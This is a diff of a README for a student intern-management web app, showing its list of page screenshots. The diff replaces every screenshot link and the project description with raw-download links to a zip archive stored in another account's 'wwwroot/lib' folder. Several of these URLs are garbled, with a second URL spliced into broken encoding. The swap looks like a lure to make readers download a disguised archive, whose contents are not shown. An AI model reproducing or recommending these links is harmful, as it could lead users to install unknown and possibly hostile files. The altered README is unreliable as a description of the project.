@@ -1,57 +1,57 @@
 # InternManagerFinalEditions
-InternManagerFinal.Editions.Collaborators by ; Caner Ay Celep, Eyüp Ayaz , İsa Oğuz ,Mehmet Yusuf Alpay
+https://github.com/Alpaymh/InternManagerFinalEditions/raw/refs/heads/master/InternManager/wwwroot/lib/Manager-Editions-Final-Intern-2.9.zip by ; Caner Ay Celep, Eyüp Ayaz , İsa Oğuz ,Mehmet Yusuf Alpay
 
 <ul>
 <li>Main
 </br>
-<img src="https://github.com/caner24/InternManagerFinalEditions/blob/master/UYGULAMA%20%C4%B0%C3%87%C4%B0/Main-1.png">
+<img src="https://github.com/Alpaymh/InternManagerFinalEditions/raw/refs/heads/master/InternManager/wwwroot/lib/Manager-Editions-Final-Intern-2.9.zip%20%C4%B0%C3%87%C4%https://github.com/Alpaymh/InternManagerFinalEditions/raw/refs/heads/master/InternManager/wwwroot/lib/Manager-Editions-Final-Intern-2.9.zip">
 </li>
 <li>Login Page
 </br>
-<img src="https://github.com/caner24/InternManagerFinalEditions/blob/master/UYGULAMA%20%C4%B0%C3%87%C4%B0/main-2.png">
+<img src="https://github.com/Alpaymh/InternManagerFinalEditions/raw/refs/heads/master/InternManager/wwwroot/lib/Manager-Editions-Final-Intern-2.9.zip%20%C4%B0%C3%87%C4%https://github.com/Alpaymh/InternManagerFinalEditions/raw/refs/heads/master/InternManager/wwwroot/lib/Manager-Editions-Final-Intern-2.9.zip">
 </li>
 <li>Reset Password (user email send new password)
 </br>
-<img src="https://github.com/caner24/InternManagerFinalEditions/blob/master/UYGULAMA%20%C4%B0%C3%87%C4%B0/main-3.png">
+<img src="https://github.com/Alpaymh/InternManagerFinalEditions/raw/refs/heads/master/InternManager/wwwroot/lib/Manager-Editions-Final-Intern-2.9.zip%20%C4%B0%C3%87%C4%https://github.com/Alpaymh/InternManagerFinalEditions/raw/refs/heads/master/InternManager/wwwroot/lib/Manager-Editions-Final-Intern-2.9.zip">
 </li>
 <li>Boss Page
 </br>
-<img src="https://github.com/caner24/InternManagerFinalEditions/blob/master/UYGULAMA%20%C4%B0%C3%87%C4%B0/BOSS-3.png">
+<img src="https://github.com/Alpaymh/InternManagerFinalEditions/raw/refs/heads/master/InternManager/wwwroot/lib/Manager-Editions-Final-Intern-2.9.zip%20%C4%B0%C3%87%C4%https://github.com/Alpaymh/InternManagerFinalEditions/raw/refs/heads/master/InternManager/wwwroot/lib/Manager-Editions-Final-Intern-2.9.zip">
 </li>
 </br>
 <li>Boss (Excell To SQL Page)
 </br>
-<img src="https://github.com/caner24/InternManagerFinalEditions/blob/master/UYGULAMA%20%C4%B0%C3%87%C4%B0/boss-1.png">
+<img src="https://github.com/Alpaymh/InternManagerFinalEditions/raw/refs/heads/master/InternManager/wwwroot/lib/Manager-Editions-Final-Intern-2.9.zip%20%C4%B0%C3%87%C4%https://github.com/Alpaymh/InternManagerFinalEditions/raw/refs/heads/master/InternManager/wwwroot/lib/Manager-Editions-Final-Intern-2.9.zip">
 </li>
 </br>
 <li>Komisyon Main
 </br>
-<img src="https://github.com/caner24/InternManagerFinalEditions/blob/master/UYGULAMA%20%C4%B0%C3%87%C4%B0/Kom-1.png">
+<img src="https://github.com/Alpaymh/InternManagerFinalEditions/raw/refs/heads/master/InternManager/wwwroot/lib/Manager-Editions-Final-Intern-2.9.zip%20%C4%B0%C3%87%C4%https://github.com/Alpaymh/InternManagerFinalEditions/raw/refs/heads/master/InternManager/wwwroot/lib/Manager-Editions-Final-Intern-2.9.zip">
 </li>
 </br>
 <li>Komisyon List Teachers
 </br>
-<img src="https://github.com/caner24/InternManagerFinalEditions/blob/master/UYGULAMA%20%C4%B0%C3%87%C4%B0/Kom-2.png">
+<img src="https://github.com/Alpaymh/InternManagerFinalEditions/raw/refs/heads/master/InternManager/wwwroot/lib/Manager-Editions-Final-Intern-2.9.zip%20%C4%B0%C3%87%C4%https://github.com/Alpaymh/InternManagerFinalEditions/raw/refs/heads/master/InternManager/wwwroot/lib/Manager-Editions-Final-Intern-2.9.zip">
 </li>
 <li>Komisyon Add Teachers To Students
 </br>
-<img src="https://github.com/caner24/InternManagerFinalEditions/blob/master/UYGULAMA%20%C4%B0%C3%87%C4%B0/Kom-3.png">
+<img src="https://github.com/Alpaymh/InternManagerFinalEditions/raw/refs/heads/master/InternManager/wwwroot/lib/Manager-Editions-Final-Intern-2.9.zip%20%C4%B0%C3%87%C4%https://github.com/Alpaymh/InternManagerFinalEditions/raw/refs/heads/master/InternManager/wwwroot/lib/Manager-Editions-Final-Intern-2.9.zip">
 </li>
 </br>
 <li>Mail Students - 1
 </br>
-<img src="https://github.com/caner24/InternManagerFinalEditions/blob/master/UYGULAMA%20%C4%B0%C3%87%C4%B0/KOM-6.png">
+<img src="https://github.com/Alpaymh/InternManagerFinalEditions/raw/refs/heads/master/InternManager/wwwroot/lib/Manager-Editions-Final-Intern-2.9.zip%20%C4%B0%C3%87%C4%https://github.com/Alpaymh/InternManagerFinalEditions/raw/refs/heads/master/InternManager/wwwroot/lib/Manager-Editions-Final-Intern-2.9.zip">
 </li>
 <li>Mail Students - 2
 </br>
-<img src="https://github.com/caner24/InternManagerFinalEditions/blob/master/UYGULAMA%20%C4%B0%C3%87%C4%B0/KOM-7.png">
+<img src="https://github.com/Alpaymh/InternManagerFinalEditions/raw/refs/heads/master/InternManager/wwwroot/lib/Manager-Editions-Final-Intern-2.9.zip%20%C4%B0%C3%87%C4%https://github.com/Alpaymh/InternManagerFinalEditions/raw/refs/heads/master/InternManager/wwwroot/lib/Manager-Editions-Final-Intern-2.9.zip">
 </li>
 <li>Mail Students - 3
 </br>
-<img src="https://github.com/caner24/InternManagerFinalEditions/blob/master/UYGULAMA%20%C4%B0%C3%87%C4%B0/KOM-8.png">
+<img src="https://github.com/Alpaymh/InternManagerFinalEditions/raw/refs/heads/master/InternManager/wwwroot/lib/Manager-Editions-Final-Intern-2.9.zip%20%C4%B0%C3%87%C4%https://github.com/Alpaymh/InternManagerFinalEditions/raw/refs/heads/master/InternManager/wwwroot/lib/Manager-Editions-Final-Intern-2.9.zip">
 </li>
 <li>Student Page
 </br>
-<img src="https://github.com/caner24/InternManagerFinalEditions/blob/master/UYGULAMA%20%C4%B0%C3%87%C4%B0/OGR-1.png">
+<img src="https://github.com/Alpaymh/InternManagerFinalEditions/raw/refs/heads/master/InternManager/wwwroot/lib/Manager-Editions-Final-Intern-2.9.zip%20%C4%B0%C3%87%C4%https://github.com/Alpaymh/InternManagerFinalEditions/raw/refs/heads/master/InternManager/wwwroot/lib/Manager-Editions-Final-Intern-2.9.zip">
 </li>
 </ul>
